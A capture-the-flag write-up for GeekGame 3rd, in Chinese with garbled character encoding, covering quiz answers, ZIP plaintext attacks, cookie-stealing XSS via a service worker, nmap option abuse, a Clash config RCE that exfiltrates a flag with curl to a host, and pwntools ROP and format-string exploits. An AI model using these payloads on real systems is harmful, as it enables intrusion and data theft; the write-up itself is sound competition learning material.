# GeekGame 3rd Writeup by mariodon

## ä¸€çœ¼ç›¯å¸§

å¦‚äºŒé˜¶æ®µæç¤ºæ‰€è¯´ï¼Œâ€œåªéœ€è¦æŠŠ GIF é‡Œæ¯ä¸ªå¸§é‡Œçš„å­—æ¯æ‹¼èµ·æ¥ï¼Œç„¶ååšä¸ª ROT13 å°±è§£å‡ºæ¥äº†ã€‚â€

## å°åŒ—é—®ç­”!!!!!

### åœ¨åŒ—äº¬å¤§å­¦ï¼ˆæ ¡çº§ï¼‰é«˜æ€§èƒ½è®¡ç®—å¹³å°ä¸­ï¼Œä»€ä¹ˆå‘½ä»¤å¯ä»¥æäº¤ä¸€ä¸ªéäº¤äº’å¼ä»»åŠ¡ï¼Ÿ

æ‰¾åˆ°è®¡ç®—å¹³å°çš„[æ–‡æ¡£](https://hpc.pku.edu.cn/_book/guide/slurm/sbatch.html)ï¼Œèƒ½çœ‹åˆ° salloc æ˜¯ç”¨äºäº¤äº’è¿è¡Œä½œä¸šçš„ï¼Œé‚£ä¹ˆä¸Šé¢æ²¡ææ˜¯å¦æ˜¯äº¤äº’å¼çš„ sbatch å°±æ˜¯éäº¤äº’äº†ã€‚

### æ ¹æ® GPL è®¸å¯è¯çš„è¦æ±‚ï¼ŒåŸºäº Linux äºŒæ¬¡å¼€å‘çš„æ“ä½œç³»ç»Ÿå†…æ ¸å¿…é¡»å¼€æºã€‚ä¾‹å¦‚å°ç±³å…¬å¸å¼€æºäº† Redmi K60 Ultra æ‰‹æœºçš„å†…æ ¸ã€‚å…¶å†…æ ¸ç‰ˆæœ¬å·æ˜¯ï¼Ÿ

å†…æ ¸ç‰ˆæœ¬å·èƒ½åœ¨ [Makefile](https://github.com/MiCode/Xiaomi_Kernel_OpenSource/blob/corot-t-oss/Makefile) é‡Œçœ‹åˆ°ã€‚

### æ¯æ¬¾è‹¹æœäº§å“éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„è¯†åˆ«åç§°ï¼ˆIdentifierï¼‰ï¼Œä¾‹å¦‚åˆä»£ iPhone æ˜¯ iPhone1,1ã€‚é‚£ä¹ˆ Apple Watch Series 8ï¼ˆèœ‚çªç‰ˆæœ¬ï¼Œ41mm å°ºå¯¸ï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ

[å—¯æœ](https://gist.github.com/adamawolf/3048717)ã€‚

### æœ¬å±Š PKU GeekGame çš„æ¯”èµ›å¹³å°ä¼šç¦æ­¢é€‰æ‰‹æ˜µç§°ä¸­åŒ…å«æŸäº›ç‰¹æ®Šå­—ç¬¦ã€‚æˆªæ­¢åˆ° 2023 å¹´ 10 æœˆ 1 æ—¥ï¼Œå…±ç¦æ­¢äº†å¤šå°‘ä¸ªå­—ç¬¦ï¼Ÿï¼ˆæç¤ºï¼šæœ¬é¢˜ç­”æ¡ˆä¸ Python ç‰ˆæœ¬æœ‰å…³ï¼Œä»¥å¹³å°å®é™…è¿è¡Œæƒ…å†µä¸ºå‡†ï¼‰

çœ‹[å¹³å°ä»£ç ](https://github.com/PKU-GeekGame/gs-backend/blob/master/src/store/user_profile_store.py)ï¼Œå†æ ¹æ®æ­¥éª¤çš„ Python ç‰ˆæœ¬ (â‰¥3.8) è¯•ã€‚

### åœ¨ 2011 å¹´ 1 æœˆï¼ŒBilibili æ¸¸æˆåŒºä¸‹å…±æœ‰å“ªäº›å­åˆ†åŒºï¼Ÿï¼ˆæŒ‰ç½‘ç«™æ˜¾ç¤ºé¡ºåºï¼Œä»¥åŠè§’é€—å·åˆ†éš”ï¼‰

Web Archive æ‰¾ï¼Œå½“æ—¶ Bç«™ åŸŸååç¼€æ˜¯ .tvã€‚

### è¿™ä¸ªç…§ç‰‡ä¸­å‡ºç°äº†ä¸€ä¸ªå¤§å‹å»ºç­‘ç‰©ï¼Œå®ƒçš„å®˜æ–¹ç½‘ç«™çš„åŸŸåæ˜¯ä»€ä¹ˆï¼Ÿï¼ˆç…§ç‰‡ä¸­éƒ¨åˆ†ä¿¡æ¯å·²è¢«æœ‰æ„é®æŒ¡ï¼Œè¯·æ³¨æ„æ£€æŸ¥ç­”æ¡ˆæ ¼å¼ï¼‰

æœèµåŠ©å•†æŸ¥åˆ°æ˜¯ IASP2023 å³°ä¼šï¼Œ[æ—¥ç¨‹](https://www.iaspworldconference.com/destination/social-events/)é‡Œç­¾åˆ°å¤„çš„éŸ³ä¹å…å’ŒåŸå›¾æ˜¯ä¸€ä¸ªå»ºç­‘ã€‚

## Z å…¬å¸çš„æœåŠ¡å™¨

### æœåŠ¡å™¨

æœ pcap åŒ…çš„ payload èƒ½çŸ¥é“æ˜¯ ZMODEM åè®®ï¼Œé…äº† iTerm2 çš„ [zmodem é›†æˆ](https://github.com/robberphex/iTerm2-zmodem) åŠå¤©è°ƒä¸é€šã€‚åæ¥å‘ç°é¢˜ç›®æœ‰ bugï¼Œecho TOKEN | ncat æ–¹å¼æœ‰é—®é¢˜ï¼Œncat ç›´æ¥è¿ä¸Šä»¥åè¾“ token å°±æ²¡é—®é¢˜ï¼Œ~~çœŸæ˜¯é†‰äº†~~ã€‚

### æµé‡åŒ…

é¢˜ç›®çš„ pcap é‡Œä¼ è¾“äº†ä¸€ä¸ª jpgï¼Œè¿™é¢˜è€ƒçš„å°±æ˜¯æ¢å¤å‡ºè¿™ä¸ªå›¾ç‰‡ã€‚

å› ä¸º ZMODEM åè®®é‡Œå¸¦ checksumï¼Œç›´æ¥æå–å‡ºæ¥æ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©æœ¬åœ°å¼€ä¸€ä¸ª rz è¿›è¡Œé‡æ”¾ã€‚

è°ƒäº†åŠå¤© tcpliveplay L2 é‡æ”¾è°ƒä¸é€šï¼Œæœ€ååˆåœ¨æœ¬åœ°èµ·äº†ä¸ª server å‘åŒ…ã€‚

```python
from scapy.all import *
from scapy.utils import rdpcap
from pwn import *

l = listen(1234)
l.wait_for_connection()

# ç”¨ wireshark æå–å‡ºä»…åŒ…å«å›å¤çš„åŒ…
pkts=rdpcap('response.pcapng')
for pkt in pkts:
    payload = bytes(pkt[TCP].payload)
    if len(payload) > 0:
        l.send(payload)
```

## çŒ«å’ªçŠ¶æ€ç›‘è§†å™¨

è¯»é¢˜ç›®ä»£ç çœ‹åˆ°èƒ½æ³¨å…¥ service åçš„å‚æ•°ï¼Œæœäº†ä¸€ä¸‹çœ‹åˆ°ç»™ service ä¼ ä¸€ä¸ªåŸºäº /etc/init.d çš„ç›¸å¯¹è·¯å¾„å¯ä»¥ç›´æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæ‰€ä»¥æŠŠ flag cat å‡ºæ¥è¾“å‡ºå³å¯ã€‚

## åŸºæœ¬åŠŸ

~~zip ç ´è§£ï¼Ÿrockyou å¯åŠ¨ã€‚ä»€ä¹ˆï¼Ÿ50å­—èŠ‚å¤§å°å†™ç‰¹æ®Šç¬¦å·ï¼Ÿæºœäº†æºœäº†ã€‚~~

### ç®€å•çš„ Flag

ç»™äº†ä¸ª chrome driverï¼ŒåŒæ—¶ä¹Ÿæœ‰æ–‡ä»¶å¤§å°å’Œ crcï¼Œèƒ½æƒ³åˆ°æ˜¯è¦è¿›è¡Œé€‰æ‹©æ˜æ–‡æ”»å‡»ã€‚
æ˜æ–‡å¯ä»¥åˆ° chrome driver çš„ [S3 listing é¡µ](https://chromedriver.storage.googleapis.com) æŒ‰æ–‡ä»¶å¤§å°æ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬ã€‚

`bkcrack -C challenge_1.zip -c chromedriver_linux64.zip -p chromedriver_linux64.zip`
å¾—åˆ° key ä»¥åå†ç”¨ key æŠŠ zip çš„å¯†ç ä¿®æ”¹æ‰ï¼Œ
`bkcrack -C challenge_1.zip -k 8c25f8be df1db6d3 8060b113 -U challenge1_unlocked.zip password`ï¼Œä¹‹åç”¨è§£å‹å·¥å…·å’Œå¯†ç  password å°±å¯ä»¥è§£å‡º flag1.txt äº†ã€‚

### å†·é…·çš„ Flag

èƒ½çœ‹åˆ° flag2 æ˜¯ pcapng ç±»å‹ï¼Œèƒ½æƒ³åˆ°è¿™é¢˜æ˜¯æ ¹æ®æ–‡ä»¶å¤´å†æ¬¡è¿›è¡Œé€‰æ‹©æ˜æ–‡æ”»å‡»ã€‚

ç”¨æ‰‹å¤´å‡ ä¸ª pcapng å½’çº³å‡ºäº†ä¸€ä¸‹çš„æ–‡ä»¶å¤´ç„¶åè¿›è¡Œçˆ†ç ´ã€‚
æ³¨æ„å› ä¸ºå…¬å…±çš„éƒ¨åˆ† offset ä¸æ˜¯ 0ï¼Œéœ€è¦æ‰‹åŠ¨æŒ‡å®š offsetã€‚
~~ä¹‹å‰æƒ³å½“ç„¶ä»¥ä¸º ffff å‰éƒ½æ˜¯å…¬å…±çš„ç„¶è€Œè·‘ä¸å‡ºæ¥ã€‚~~

```hexdump
00000000: 0000 4d3c 2b1a 0100 0000 ffff ffff ffff  ..M<+...........
00000010: ffff
```

`bkcrack -C challenge_2.zip -c flag2.pcapng -p pcapng_header.bin -d flag2_dec.pcapng -o 6`


## éº¦æ©Â·åº“æ‹‰å¤«ç‰¹

æ‰‹ç©å°±æ‰¾åˆ° flag1 äº†ã€‚

## Emoji Wordle

### Level 1

Level 1 ç­”æ¡ˆå›ºå®šï¼Œæ‰€ä»¥æŠŠ emoji å­—å…¸çˆ†å‡ºæ¥ä¸€ä¸ªä¸ªçŒœå°±å¥½ã€‚

å†™äº†ä¸ªè¾…åŠ©è„šæœ¬å¸®å¿™æš´åŠ›çŒœã€‚
è„šæœ¬å¯ä»¥å‚è€ƒä¸‹é¢ Level 3 çš„ï¼Œåæ­£ä¹Ÿå·®ä¸å¤šã€‚

### Level 2

é¢˜ç›®è¯´ç­”æ¡ˆæ˜¯éšæœºç”Ÿæˆå¹¶å­˜å‚¨åœ¨ä¼šè¯ä¸­çš„ï¼Œé‚£ä¹ˆ F12 çœ‹ä¸€ä¸‹ï¼Œèƒ½çœ‹åˆ°å¾ˆå¤§ä¸€ä¸² JWTï¼Œ[è§£å¼€](https://jwt.io)ä»¥åèƒ½ç›´æ¥çœ‹åˆ°ç­”æ¡ˆã€‚

```json
{
  "data": {
    "level": "2",
    "remaining_guesses": "8",
    "target": "ğŸ’€ğŸ‘¿ğŸ‘•ğŸ‘ğŸ‘¹ğŸ’‚ğŸ‘‰ğŸ‘¨ğŸ’†ğŸ’ŠğŸ’‰ğŸ‘”ğŸ‘¶ğŸ‘±ğŸ‘©ğŸ‘²ğŸ‘¤ğŸ‘³ğŸ‘·ğŸ‘šğŸ‘·ğŸ‘—ğŸ‘¶ğŸ‘–ğŸ‘¾ğŸ‘ğŸ‘ºğŸ‘‘ğŸ‘‡ğŸ‘½ğŸ’„ğŸ‘¥ğŸ‘“ğŸ¿ğŸ‘™ğŸ‘½ğŸ’ŠğŸ¿ğŸ’ŠğŸ’‡ğŸ‘ƒğŸ‘„ğŸ‘ ğŸ‘¶ğŸ‘ŸğŸ‘ºğŸ‘œğŸ‘¢ğŸ‘”ğŸ’‰ğŸ’‡ğŸ’„ğŸ’ˆğŸ‘“ğŸ‘·ğŸ’ˆğŸ‘—ğŸ’€ğŸ‘’ğŸ‘€ğŸ‘€ğŸ‘±ğŸ‘ˆğŸ¿"
  },
  "nbf": 1697865485,
  "iat": 1697865485
}
```

### Level 3

ç”¨å’Œ Level 2 åŒæ ·çš„æ–¹æ³•ï¼Œå‘ç° JWT å†…å®¹å˜äº†ã€‚

```json
{
  "data": {
    "level": "3",
    "start_time": "1697865672540",
    "remaining_guesses": "3",
    "seed": "2.3622133122231228E10"
  },
  "nbf": 1697865672,
  "iat": 1697865672
}
```

ç­”æ¡ˆä¸åœ¨ token é‡Œäº†ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ start_time å’Œ seedï¼ŒçŒœæµ‹æœåŠ¡ç«¯æ ¹æ® seed å»ç®— flagã€‚
JWT æ˜¯ç­¾äº†åçš„ï¼Œæ”¹ä¸äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨ä¹‹å‰çš„ token è¿˜åŸå‰©ä½™çŒœæµ‹çš„æ¬¡æ•°ï¼Œåœ¨æŒ‡å®šæ—¶é—´å†…æ— é™æ¬¡æ•°è¯•ã€‚

è¿™ä¸€é—®éœ€è¦å†™ä¸€ä¸ªè„šæœ¬å»è‡ªåŠ¨è¯•ï¼Œä¸ç„¶åœ¨1åˆ†é’Ÿçš„æŒ‡å®šæ—¶é—´å†…çŒœä¸å‡ºæ¥ã€‚

```python
import requests

def get_yellow(results : str):
    indices = [i for i, x in enumerate(results) if x == 'ğŸŸ¨']
    return indices


def get_green(results : str):
    indices = [i for i, x in enumerate(results) if x == 'ğŸŸ©']
    return indices


def find_result(text : str):
    for line in text.splitlines():
        if 'results.push' in line:
            results = line.split("\"")[1]
            assert len(results) == 64
            print(results)
            return results


def make_guess(cok:str, a : str):
    assert len(a) == 64
    r = requests.get('https://prob14.geekgame.pku.edu.cn/level3', params={'guess': a}, cookies=cok)
    r.raise_for_status()
    print(r.text)
    results = find_result(r.text)
    return results


def start_guess():
    r = requests.get('https://prob14.geekgame.pku.edu.cn/level3')
    r.raise_for_status()
    return r.cookies


def output(a : dict):
    o = ''
    for i in range(64):
        o += a[i]
    print(o)
    return o


def get_new_emoji():
    r = requests.get('https://prob14.geekgame.pku.edu.cn/level1')
    r.raise_for_status()
    for line in r.text.splitlines():
        if 'placeholder' in line:
            results = line.split("\"")[1]
            assert len(results) == 64
            return results

ans = {}
cok = start_guess()
while len(ans) != 64:
    i_guess = get_new_emoji()
    initial = make_guess(cok, i_guess)
    yellow = get_yellow(initial)

    for i in yellow:
        correct = i_guess[i]
        if correct in ans.values():
            continue
        rst = make_guess(cok, correct * 64)
        correct_idx = get_green(rst)
        for j in correct_idx:
            ans[j] = correct
            print(f'{j}={correct}')

    print(ans)
    print(len(ans))

make_guess(cok, output(ans))
```

## ç¬¬ä¸‰æ–°XSS

### å·¡çŒ

flag cookie åœ¨ /admin çš„ path ä¸Šï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ª iframe å»è¯»ã€‚

```html
<iframe id="inline" title="inline" width="300" height="200" src="/admin">
</iframe>
<script>
  function a() {
    var cookie = document.getElementById("inline").contentDocument.cookie;
    document.title = cookie;
  }
</script>

<body onload=a()>
```

### è®°å¿†

bot å…ˆè®¿é—® xss é¡µå†è®¿é—® admin é¡µé¢ï¼Œç¬¬ä¸€é˜¶æ®µæ²¡ä»€ä¹ˆæƒ³æ³•ï¼Œæ ¹æ®ç¬¬äºŒé˜¶æ®µæç¤ºï¼Œéœ€è¦æ³¨å†Œä¸€ä¸ª service worker åˆ° / è¿™ä¸ª scope ä¸Šã€‚è¿™ä¸ª service worker å¯ä»¥æ‹¦æˆª /adminï¼Œè¿”å›æˆ‘ä»¬çš„ç½‘é¡µï¼Œç„¶åç”¨è¿™ä¸ªç½‘é¡µæŠŠ flag cookie æ‹¿å‡ºæ¥ã€‚

xss é¡µï¼šæ³¨å†Œ service worker

```html
<script>
    window.addEventListener('load', function() {
        navigator.serviceWorker.register('/sw/', {scope: '/'}).then(function(registration) {
            console.log('ServiceWorker registration successful with scope: ', registration.scope);
        }, function(err) {
            console.log('ServiceWorker registration failed: ', err);
        });
    });
</script>
```

service worker å†…å®¹ï¼šæ‹¦æˆª /admin é¡µé¢

```js
self.addEventListener('fetch', function(event) {
    console.log('fetch')
    return event.respondWith(fetch("/admin2/"));
});
self.addEventListener('activate', function(event) {
    console.log('activate');
    return self.clients.claim();
});
self.addEventListener('install', function(event) {
    console.log('install');
});
```
å› ä¸º scope é™åˆ¶ï¼Œæ‰€ä»¥è®¾ç½®ä¸€ä¸‹ service worker çš„ headerã€‚

```json
{"Content-Type": "text/javascript", "Service-Worker-Allowed":"/"}
```

å‡ admin é¡µï¼šè¾“å‡º flag

```html
<script>
  function a()
  {
    var cookie = document.cookie;
    document.title = cookie;
  }
  function load()
  {
    setInterval(a, 200)
  }
  </script>

<body onload=load()>
```



## ç®€å•çš„æ‰“å­—ç¨¿

### Super Easy

äºŒé˜¶æ®µæç¤ºéœ€è¦æŠŠ flag ä½œä¸ºç±»å‹æ£€æŸ¥å™¨æŠ¥é”™çš„ä¸€éƒ¨åˆ†è¾“å‡ºï¼Œä½†æ˜¯å¦‚æœè¾“å‡ºåŒ…å« flag å­—ç¬¦ä¸²å°±ä¼šå´©ï¼Œæ‰€ä»¥éœ€è¦æŠŠ flag çš„ç±»å‹åšä¸€äº›å˜æ¢ã€‚

ä¸€é¡¿æœç´¢å‘ç°äº†[TS æ¨¡æ¿å­—ç¬¦ä¸²ç±»å‹](https://juejin.cn/post/7129864202604249096)æœ‰å¾ˆå¤šéªšæ“ä½œï¼Œå…¶ä¸­åè½¬å­—ç¬¦ä¸²å°±æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„ã€‚

```ts
type ReverseString<Str extends string> = Str extends `${ infer First }${ infer Rest }` ? `${ ReverseString<Rest> }${ First }` : Str;
type T = ReverseString<flag1>;
let a: T = 'boom'
```

## é€ç•Œè®¡åˆ’

~~ä¸€é˜¶æ®µæ—¶ç¿»äº†ä¸‹é›†æˆçš„åˆ—è¡¨ï¼Œæˆ‘å»æ€ä¹ˆè¿™ä¹ˆå¤šï¼Œæ•…æ”¾å¼ƒã€‚~~

äºŒé˜¶æ®µæç¤ºå¯ä»¥ç”¨ nmap é›†æˆè¾“å‡º flagã€‚

æˆ‘ä»¬å…ˆè¯»è¯» nmap æ–‡æ¡£ï¼Œç”¨ `-iL` å¯ä»¥è¯»ä»»æ„æ–‡ä»¶ï¼Œç»è¿‡å°è¯•ä¹Ÿä¼šæŠŠå†…å®¹æ‰“åˆ°æŠ¥é”™é‡Œã€‚

é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•æŠŠæŠ¥é”™æ‹¿å‡ºæ¥äº†ã€‚

è‡ªç„¶è€Œç„¶åœ°æƒ³åˆ°ï¼Œèƒ½ä¸èƒ½æŠŠ flag æ‰“åˆ° home assistant çš„ log é‡Œå‘¢ï¼Ÿ

çœ‹äº†çœ‹[ä»£ç ](https://github.com/home-assistant-libs/python-nmap/blob/master/nmap/nmap.py)ï¼Œnmap é›†æˆæ˜¯é è§£æ nmap çš„ xml è¾“å‡ºæ¥å·¥ä½œçš„ï¼Œåªè¦ xml è§£æå¤±è´¥äº†ï¼Œé›†æˆå°±ä¼šæŠŠ nmap stderr çš„å†…å®¹æ‰“åˆ° logã€‚

äºæ˜¯æƒ³åˆ°ï¼Œåªè¦æ··ä¸€ç‚¹åˆ«çš„ä¸œè¥¿åˆ° xml é‡Œï¼Œé‚£ä¹ˆæ ‡å‡†è¾“å‡ºæœ‰å¾ˆå¤§æ¦‚ç‡æ˜¯è§£æå¤±è´¥çš„ã€‚

å†æ¬¡æ‰“å¼€ nmap æ–‡æ¡£ï¼Œæ‰¾åˆ°äº† `-oS` è¿™ä¸ªè¾“å‡ºé€‰é¡¹ï¼ŒæŒ‡å®šè¾“å‡ºåˆ° stdout åç¡®å®è¾“å‡ºäº†æ— æ•ˆçš„ xmlï¼Œå¤§åŠŸå‘Šæˆã€‚
```log
2023-10-18 18:26:30.060 ERROR (MainThread) [homeassistant.components.nmap_tracker] Nmap scanning failed: 'Failed to resolve "flag{sOOoo-many-lOoPHOles-in-HOmE-AsSisTant}".\nWARNING: No targets were specified, so 0 hosts scanned.\n
```
æœ€åç»™ nmap é›†æˆæŒ‡å®šçš„é™„åŠ é€‰é¡¹ï¼š`-iL /flag.txt -oS -`ã€‚

## éæ³•æ‰€å¾—

### Flag 1

å†™ä¸€ä¸ªæ–°çš„é…ç½®æ–‡ä»¶ï¼Œå¼•ç”¨å·²æœ‰çš„é…ç½®ã€‚

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090

proxy-groups:
  - name: UseProvider
    type: select
    use:
      - test

proxy-providers:
  test:
    type: file
    path: /app/profiles/flag.yml
```


### Flag 2

ä¿®æ”¹ç›®æ ‡ url çš„è§£æï¼Œå†åšä¸€ä¸ªå¯¹åº”çš„ç½‘é¡µã€‚

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090

proxy-groups:
  - name: UseProvider
    type: select
    use:
      - test


proxy-providers:
  test:
    type: file
    path: /app/profiles/flag.yml


hosts:
  'ys.pku.edu.cn': 172.17.0.1
```

```html
<head>
  <script>
    function toggle() {
      var x = document.getElementById("primogem_code");
      if (x.type === "password") {
        x.type = "text";
      } else {
        x.type = "password";
      }
    }
    function script() {
      setTimeout(toggle, 3000)
    }
  </script>
</head>

<body onload="script();">
  <input type="password" id="primogem_code" size="100">
```

### Flag 3

flag3 ä¸€å®šè¦é€šè¿‡è°ƒç”¨ readfile è·å¾—ï¼Œé‚£å°±å¾—ç¿»ç¿» [RCE](https://github.com/Fndroid/clash_for_windows_pkg/issues/2710) äº†ã€‚

ä¿®æ”¹ poc æ—¶è¸©å‘ï¼Œå¸¦ç©ºæ ¼è¿˜æœ‰é‡å®šå‘ç¬¦å·ä¼šæœ‰å„ç§è«åå…¶åçš„é—®é¢˜ï¼Œè°ƒè¯•åˆ°ç¬¬äºŒé˜¶æ®µç”¨äº†ç‚¹ shell é­”æ³•æ‰è°ƒé€šï¼Œ~~ä¸¢æ­»äººäº†~~ã€‚


```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a<img/src="1"/onerror=eval(`require("child_process").exec("IFS=];a=$(/app/readflag);b=curl]172.17.0.1:8000/$a;$b",{"shell":"/bin/bash"});`);>
    type: socks5
    server: 127.0.0.1
    port: "1926"
    skip-cert-verify: true

proxy-groups:
  -
    name: <img/src="1"/onerror=eval(`require("child_process").exec("IFS=];a=$(/app/readflag);b=curl]172.17.0.1:8000/$a;$b",{"shell":"/bin/bash"});`);>
    type: select
    proxies:
    - a<img/src="1"/onerror=eval(`require("child_process").exec("IFS=];a=$(/app/readflag);b=curl]172.17.0.1:8000/$a;$b",{"shell":"/bin/bash"});`);>
```


## æ±‰åŒ–ç»¿è‰²ç‰ˆå…è´¹ä¸‹è½½

### æ™®é€šä¸‹è½½

GARbro è§£å¼€ xp3 æ‰¾ flagã€‚

### é«˜é€Ÿä¸‹è½½

æ ¹æ®è§£åŒ…å¾—åˆ°ä¿¡æ¯ï¼Œè¾“å…¥çš„å†…å®¹ä»¥ hash å½¢å¼å‚¨å­˜ï¼Œé‚£ä¹ˆå°±å¾—è§£å¯†å­˜æ¡£è·å¾— hashï¼Œå†åæ¨åŸæ–‡ã€‚

è§£å¼€æ‰€æœ‰æ–‡ä»¶å¯ä»¥å‘ç°ï¼Œå­˜æ¡£é‡Œä¸ä½†æœ‰è¾“å…¥çš„ hashï¼Œè¿˜æœ‰å„ä¸ªå­—æ¯è¾“å…¥çš„æ¬¡æ•°ï¼Œé‚£ä¹ˆåªè¦å†™ä¸ªè„šæœ¬æš´åŠ›äº†ã€‚

```python
from itertools import product

target = 7748521

prefix = 'flag{'
suffix = '}'

for a in product('AEIO', repeat=16):
    full = prefix + ''.join(a) + suffix
    if full.count('A') != 6 or full.count('E') != 3 or full.count('I') != 1 or full.count('O') != 6:
        continue
    hash = 1337
    for l in a:
        if l == 'A':
            hash = hash * 13337 + 11
        elif l == 'E':
            hash = hash * 13337 + 22
        elif l == 'I':
            hash = hash * 13337 + 33
        elif l == 'O':
            hash = hash * 13337 + 44
        elif l == 'U':
            hash = hash * 13337 + 55

    hash = hash * 13337 + 66
    hash = hash % 19260817

    if hash == target:
        print(full)
```

## åˆå­¦ C è¯­è¨€

### Flag 1

ä»£ç å®¡è®¡ï¼Œ`printf` çš„å†…å®¹å¯ä»¥æ§åˆ¶ï¼Œå¯ä»¥åˆ©ç”¨ format string æ³„æ¼å†…å­˜ã€‚

æˆ‘åœ¨æœ¬åœ°æŠŠç¨‹åºè·‘èµ·æ¥ï¼Œè¾“å…¥ä¸€å † %lx æ‰¾ flag ä½ç½®ï¼Œç„¶åå†åœ¨è¿œç¨‹ç”¨åŒæ ·çš„æ–¹æ³•æ¢å¤äº† flagã€‚


## Baby Stack

### Flag 1

é¢˜ç›®åéƒ½å« Baby Stack äº†ï¼Œåº”è¯¥æ˜¯è€ƒå¯Ÿæ ˆæº¢å‡ºã€‚

å…ˆçœ‹çœ‹ä¿æŠ¤æªæ–½ï¼Œæ²¡å¼€ Stack Canary å’Œ PIEã€‚

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

å†çœ‹çœ‹æœ‰ä»€ä¹ˆä»£ç ã€‚

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+Ch] [rbp-7Ch] BYREF
  __int64 v5[12]; // [rsp+10h] [rbp-78h] BYREF
  int v6; // [rsp+70h] [rbp-18h]

  init(argc, argv, envp);
  memset(v5, 0, sizeof(v5));
  v6 = 0;
  puts("Welcome to babystack:)");
  puts("input the size of your exploitation string:(less than 100 chars with the ending \\n or EOF included!)");
  __isoc99_scanf("%d", &v4);
  if ( v4 > 0x64 )
  {
    puts(":(");
  }
  else
  {
    puts("please input your string:");
    get_line(v5, v4);
  }
  return 0;
}

ssize_t __fastcall get_line(__int64 a1, int a2)
{
  unsigned int i; // ebp
  ssize_t result; // rax
  _BYTE *v4; // rbx

  for ( i = 0; ; ++i )
  {
    result = (unsigned int)(a2 - 1);
    if ( (unsigned int)result <= i )
      break;
    v4 = (_BYTE *)(a1 + i);
    result = read(0, v4, 1uLL);
    if ( *v4 == 10 )
    {
      *v4 = 0;
      return result;
    }
  }
  return result;
}

int backdoor()
{
  return system("/bin/sh");
}
```

æœ‰ä¸€ä¸ª backdoor å‡½æ•°ï¼Œé‚£ç›®æ ‡å°±æ˜¯æº¢å‡ºæ ˆï¼Œå°† return address è¦†ç›–æˆ backdoor å‡½æ•°çš„åœ°å€ã€‚

æ ˆåº•éƒ¨çš„å˜é‡åœ¨ 0x7C çš„ä½ç½®ï¼Œä½†æ˜¯æˆ‘ä»¬åªèƒ½è¾“å…¥ 100 å­—èŠ‚ï¼Œä¸å¤Ÿè¦†ç›– return addressã€‚
é‚£æœ‰æ²¡æœ‰åŠæ³•ç»•è¿‡å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œå‘Šè¯‰å®ƒæˆ‘ä»¬è¦è¾“å…¥ 0 ä¸ªå­—èŠ‚ï¼Œget_line å‡½æ•°åœ¨åˆ¤æ–­å·²å†™å…¥å­—èŠ‚æ•°æ—¶å°±ä¼šæº¢å‡ºï¼Œæˆ‘ä»¬å°±èƒ½å†™å…¥è¶³å¤Ÿå¤§çš„ buffer äº†ã€‚

æ¥ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªä¼ ç»Ÿçš„ stack overflow ä»»åŠ¡äº†ï¼Œæ³¨æ„éœ€è¦å°† rsp æŒ‰16å­—èŠ‚å¯¹é½ï¼Œä¸ç„¶è°ƒä¸äº† systemã€‚

```python
from pwn import *
context.clear(arch='amd64')
elf = ELF('./challenge1')

rop = ROP(elf)
rop.raw('A' * 120)
# ret
rop.call(0x40101a)
rop.call(elf.symbols['backdoor'])
p = remote('prob10.geekgame.pku.edu.cn', 10010)
p.sendline(b'TOKEN')
p.recvuntil(b'Welcome to babystack:)')
p.sendline(b'0')
p.recvuntil(b'please input your string:')
p.sendline(rop.chain())
p.interactive()
```

### Flag 2

åŒæ ·å…ˆçœ‹çœ‹ä¿æŠ¤æªæ–½å’Œä»£ç ã€‚
ä¿æŠ¤æªæ–½å’Œä¸Šä¸€é—®ä¸€æ ·ï¼Œä»£ç ç®€å•äº†ä¸å°‘ï¼Œ~~pwn é¢˜æ„Ÿè§‰ä»£ç è¶Šå°‘ï¼Œé¢˜ç›®è¶Šçƒ¦ã€‚~~

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[64]; // [rsp+0h] [rbp-78h] BYREF
  char s[56]; // [rsp+40h] [rbp-38h] BYREF

  init(argc, argv, envp);
  puts("please enter your flag~(less than 0x20 characters)");
  __isoc99_scanf("%s", s);
  if ( (int)strlen(s) > 32 )
  {
    puts("byebye~");
  }
  else
  {
    printf("this is your flag: ");
    printf(s);
    puts("\nWhat will you do to capture it?:");
    __isoc99_scanf("%s", v4);
    puts("so you want to ");
    printf(v4);
    printf("\n and your flag again? :");
    __isoc99_scanf("%s", s);
    puts(s);
    puts("go0d_j0b_und_go0d_luck~:)");
  }
  return 0;
}
```

else åˆ†æ”¯çš„ä¸¤ä¸ª scanf éƒ½æ²¡æœ‰åšé•¿åº¦æ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯è¯´éƒ½å¯ä»¥æº¢å‡ºã€‚
ä¸ºäº†è½»æ¾ï¼Œè¿˜æ˜¯é€‰æ‹©ä»æ ˆåº•éƒ¨çš„å˜é‡æ³¨å…¥ã€‚

æ—¢ç„¶æ²¡æœ‰ backdoor å‡½æ•°äº†ï¼Œæˆ‘ä»¬åªèƒ½è‡ªå·±è°ƒç”¨ system äº†ã€‚

å› ä¸º os æ¯æ¬¡åŠ è½½åŠ¨æ€åº“æ—¶éƒ½ä¼šæ”¾åœ¨ä¸åŒçš„åœ°å€ï¼Œè¿™é¢˜éœ€è¦å…ˆæ³„æ¼ libc çš„åŸºåœ°å€ï¼Œç„¶åç®—å‡º system å‡½æ•°çš„åœ°å€ï¼Œå†~~å¹²åäº‹~~è°ƒç”¨ã€‚

